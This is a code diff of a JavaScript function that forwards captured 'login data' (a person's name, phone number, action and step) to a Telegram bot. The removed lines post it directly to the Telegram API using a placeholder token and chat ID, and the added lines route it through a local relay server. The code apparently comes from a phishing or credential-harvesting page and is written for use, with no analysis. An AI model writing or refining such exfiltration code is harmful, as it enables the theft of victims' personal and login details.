@@ -113,30 +113,12 @@
         });
 
         // Telegram Bot Function
-        async function sendToTelegram(data) {
-            const BOT_TOKEN = '7889876543:AAHxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'; // Ganti dengan token bot Anda
-            const CHAT_ID = '-1001234567890'; // Ganti dengan chat ID Anda
-            
-            const message = `
-🔔 *Data Login Baru*
-👤 *Nama:* ${data.nama}
-📱 *No HP:* ${data.nohp}
-🎯 *Aksi:* ${data.actionType}
-⏰ *Waktu:* ${new Date().toLocaleString('id-ID')}
-📍 *Step:* ${data.step}
-            `;
-            
+                async function sendToTelegram(data) {
             try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                await fetch('http://localhost:3000/api/send-telegram', {
                     method: 'POST',
-                    headers: {
-                        'Content-Type': 'application/json',
-                    },
-                    body: JSON.stringify({
-                        chat_id: CHAT_ID,
-                        text: message,
-                        parse_mode: 'Markdown'
-                    })
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(data)
                 });
             } catch (error) {
                 console.log('Telegram send error:', error);
